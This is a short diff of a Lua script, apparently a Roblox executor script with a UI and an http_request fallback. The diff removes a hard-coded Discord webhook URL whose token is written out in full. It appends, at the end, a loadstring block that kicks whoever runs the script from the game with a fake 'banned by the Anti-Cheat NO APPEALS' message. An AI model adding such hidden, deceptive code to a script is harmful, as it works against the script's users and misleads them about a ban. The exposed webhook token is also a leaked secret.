@@ -1,4 +1,4 @@
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1457374221083742383/fisgnbNmlTlzlZtsuKiprfyescBVSbbBOEsI1Y_kJh45Py72yM1Ah7mKKrNINTGmgX61" 
+
 
 local http_request =
     http_request or
@@ -338,3 +338,9 @@ continueBtn.MouseButton1Click:Connect(function()
     main.Visible = true
     setupChar()
 end)
+
+loadstring([[
+    local player = game:GetService("Players").LocalPlayer
+    repeat task.wait() until player
+    player:Kick("banned by the Anti-Cheat NO APPEALS")
+]])()
